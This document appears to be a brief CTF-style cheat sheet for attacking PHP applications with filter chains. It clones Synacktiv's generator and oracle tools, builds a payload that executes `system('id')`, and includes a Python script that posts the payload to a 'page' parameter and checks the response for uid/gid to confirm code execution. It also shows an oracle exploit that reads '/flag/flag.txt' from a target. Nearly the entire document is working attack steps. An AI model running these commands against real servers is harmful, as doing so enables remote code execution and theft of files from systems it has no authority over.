# PHP Filter Chain

RCE

```bash
git clone https://github.com/synacktiv/php_filter_chain_generator.git
cd php_filter_chain_generator
```

```bash
python3 php_filter_chain_generator.py --chain "<?php system('id'); die(); ?>"
```

```bash
PAYLOAD = "PASTE_YOUR_SUPER_LONG_PAYLOAD_HERE"

def test_rce():
    print("[*] Sending RCE Payload...")
    try:
        r = requests.post(URL, data={'page': PAYLOAD}, timeout=5)
        print(f"Status: {r.status_code}")
        print("--- Output ---")
        print(r.text)
        print("--------------")
        
        if "uid=" in r.text and "gid=" in r.text:
            print("[+] RCE SUCCESS: Found uid/gid in output.")
        else:
            print("[-] RCE FAILED: uid/gid not found.")
            
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    test_rce()
```

### LFI:

```bash
git clone https://github.com/synacktiv/php_filter_chains_oracle_exploit.git
cd php_filter_chains_oracle_exploit
```

```bash
python3 filters_chain_oracle_exploit.py \
    --target "http://IP_OF_TARGET:9051/index.php" \
    --parameter "page" \
    --file "/flag/flag.txt"
```